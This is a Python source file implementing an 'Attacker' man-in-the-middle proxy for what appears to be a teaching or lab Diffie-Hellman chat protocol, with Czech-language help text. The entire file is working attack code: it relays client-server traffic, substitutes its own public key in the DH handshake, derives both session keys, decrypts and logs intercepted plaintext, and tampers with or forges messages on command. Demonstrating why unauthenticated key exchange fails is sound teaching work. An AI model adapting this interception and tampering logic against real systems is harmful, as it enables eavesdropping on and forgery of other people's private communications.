import socket
import threading
import time

import networkstack
import protocol
from diffieHellman import DHLogic
from networkservice import NetworkService

class Attacker(NetworkService):
    def __init__(self, host, port, secure=False):
        # Target server
        self.target_host = host
        self.target_port = port
        
        # We listen on target_port + 1
        self.proxy_port = port + 1
        super().__init__('127.0.0.1', self.proxy_port)
        
        self.mitm_active = False
        self.spoof_active = False
        self.tamper_text = None
        self.secure = secure
        
        # Map: RealClientPort -> { 'server_socket': ClientSocket, 'client_socket': ClientSocket }
        self.relays = {}
        
        # Setup proxy server socket
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind(('127.0.0.1', self.proxy_port))
        self.socket.listen(5)
        self.server_stack = networkstack.ServerSocket(self.socket, on_disconnect=self.victim_disconnected)
        
        print(f"\n[MITM] Attacker Proxy started on 127.0.0.1:{self.proxy_port}")
        print(f"[MITM] Relaying traffic to {host}:{port}")
        print("[MITM] Napište 'help' pro seznam příkazů.\n")

    def loop(self):
        # Start proxy processing in a background thread
        threading.Thread(target=self.proxy_thread, daemon=True).start()
        
        # Main thread handles CLI commands
        while True:
            try:
                cmd = input()
                if cmd == "help":
                    print("\n[MITM] Dostupné příkazy:")
                    print("  attack        - Zapne/vypne aktivní MITM útok (podvržení DH klíčů).")
                    print("  tamper <text> - Nahradí obsah další zachycené dešifrované zprávy zadaným textem.")
                    print("  spoof         - Zapne/vypne generování falešných zpráv oběma stranám.")
                    print("  exit          - Ukončí proxy server a odpojí klienty.")
                    print("  help          - Zobrazí tuto nápovědu.\n")
                elif cmd == "attack":
                    self.mitm_active = not self.mitm_active
                    print(f"MITM Attack Mode: {'ENABLED' if self.mitm_active else 'DISABLED'}")
                elif cmd == "spoof":
                    self.spoof_active = not self.spoof_active
                    print(f"Spoofing Mode: {'ENABLED' if self.spoof_active else 'DISABLED'}")
                elif cmd.startswith("tamper "):
                    self.tamper_text = cmd[7:]
                    print(f"Next intercepted message will be replaced with: '{self.tamper_text}'")
                elif cmd == "exit":
                    print("Shutting down attacker proxy...")
                    break
            except EOFError:
                break

    def proxy_thread(self):
        while True:
            try:
                self.process_once()
            except Exception:
                pass
            time.sleep(0.01)

    def process_once(self):
        # 1. Accept and process data from Clients connecting to the proxy
        self.server_stack.process(self.receive_from_client, timeout=0)

        # 2. Process data coming from the Real Server back to the proxy
        disconnected_ports = []
        for port, relay in self.relays.items():
            if not relay['server_socket'].process(self.receive_from_server, (relay['client_socket'],), timeout=0):
                disconnected_ports.append(port)

        for port in disconnected_ports:
            print(f"[MITM] Relay for client port {port} disconnected.")
            self.drop_relay(port)

    def victim_disconnected(self, port):
        if port in self.relays:
            print(f"[MITM] Client {port} disconnected, closing its relay.")
            self.drop_relay(port)

    def drop_relay(self, port):
        relay = self.relays.pop(port, None)
        if relay is not None:
            relay['server_socket'].shutdown()

    def receive_from_client(self, client_socket, data):
        # Data from REAL CLIENT -> PROXY
        port = client_socket.port
        if port not in self.relays:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.target_host, self.target_port))
                server_sock = networkstack.ClientSocket(s)
                self.relays[port] = {
                    'client_socket': client_socket,
                    'server_socket': server_sock,
                    'mitm_state': {
                        'k_client': None,
                        'k_server': None,
                        'p': None,
                        'attacker_priv': None,
                        'attacker_pub': None
                    }
                }
                print(f"[MITM] New relay established for client {port}")
            except Exception as e:
                print(f"[MITM] Failed to connect to target server: {e}")
                return

        tampered = self.intercept(data, "CLIENT -> SERVER", port)
        self.relays[port]['server_socket'].send(tampered)

    def receive_from_server(self, real_client_socket, server_socket, data):
        # From REAL SERVER -> PROXY
        port = real_client_socket.port
        tampered = self.intercept(data, "SERVER -> CLIENT", port)
        real_client_socket.send(tampered)

    def intercept(self, data, direction, port):
        # Logging raw data
        hex_data = data.hex()
        print(f"[MITM INTERCEPT {direction}] Data: {hex_data[:30]}{'...' if len(hex_data) > 30 else ''}")
        
        state = self.relays[port]['mitm_state']

        if self.spoof_active:
            if "CLIENT -> SERVER" in direction:
                print("[MITM] Spoofing message to server.")
                if state['k_server']:
                    return self.encrypt_payload(b"i totally sent this lol", state['k_server'])
                return b"i totally sent this lol"
            else:
                print("[MITM] Spoofing message to client.")
                if state['k_client']:
                    return self.encrypt_payload(b"you totally received this", state['k_client'])
                return b"you totally received this"

        # 1. Plaintext Handshake Tampering
        if self.mitm_active:
            try:
                msg = data.decode("utf-8")
                
                if protocol.DH_INIT in msg and "CLIENT -> SERVER" in direction:
                    print("[MITM] Intercepted DH_INIT! Deriving keys and injecting MITM public key...")
                    head, dh_parts, tail = protocol.split_dh_message(msg, protocol.DH_INIT)
                    if len(dh_parts) >= 3:
                        p = int(dh_parts[0])
                        g = int(dh_parts[1])
                        client_pub = int(dh_parts[2])
                        
                        state['p'] = p
                        state['attacker_priv'] = DHLogic.generate_private_key(p)
                        state['attacker_pub'] = DHLogic.generate_public_key(state['attacker_priv'], g, p)
                        
                        raw_k_client = DHLogic.generate_shared_secret(state['attacker_priv'], client_pub, p)
                        state['k_client'] = DHLogic.derive_aes_key(raw_k_client)
                        
                        dh_parts[2] = str(state['attacker_pub'])
                        return protocol.join_dh_message(head, dh_parts, tail).encode("utf-8")

                elif protocol.DH_ACCEPT in msg and "SERVER -> CLIENT" in direction:
                    print("[MITM] Intercepted DH_ACCEPT! Deriving keys and injecting MITM public key...")
                    head, dh_parts, tail = protocol.split_dh_message(msg, protocol.DH_ACCEPT)
                    if len(dh_parts) >= 1 and state['p'] is not None:
                        server_pub = int(dh_parts[0])
                        
                        raw_k_server = DHLogic.generate_shared_secret(state['attacker_priv'], server_pub, state['p'])
                        state['k_server'] = DHLogic.derive_aes_key(raw_k_server)
                        
                        dh_parts[0] = str(state['attacker_pub'])

                        print(f"[MITM] K_client derived: {state['k_client'].hex()[:15]}...")
                        print(f"[MITM] K_server derived: {state['k_server'].hex()[:15]}...")
                        return protocol.join_dh_message(head, dh_parts, tail).encode("utf-8")
                        
            except Exception:
                pass

        # 2. Encrypted Message Translation
        if self.mitm_active and state['k_client'] and state['k_server']:
            try:
                if "CLIENT -> SERVER" in direction:
                    plaintext = self.decrypt_payload(data, state['k_client'])
                    print(f"[MITM] Extracted Plaintext: {plaintext.decode('utf-8', errors='ignore')}")
                    
                    if self.tamper_text:
                        print(f"[MITM] TAMPERING MESSAGE! Replacing with '{self.tamper_text}'")
                        plaintext = self.tamper_text.encode("utf-8")
                        self.tamper_text = None
                        
                    return self.encrypt_payload(plaintext, state['k_server'])
                elif "SERVER -> CLIENT" in direction:
                    plaintext = self.decrypt_payload(data, state['k_server'])
                    print(f"[MITM] Extracted Plaintext: {plaintext.decode('utf-8', errors='ignore')}")
                    
                    if self.tamper_text:
                        print(f"[MITM] TAMPERING MESSAGE! Replacing with '{self.tamper_text}'")
                        plaintext = self.tamper_text.encode("utf-8")
                        self.tamper_text = None
                        
                    return self.encrypt_payload(plaintext, state['k_client'])
            except Exception:
                pass

        return data

    def shutdown(self):
        for port in self.relays:
            self.relays[port]['server_socket'].shutdown()
        self.server_stack.shutdown()
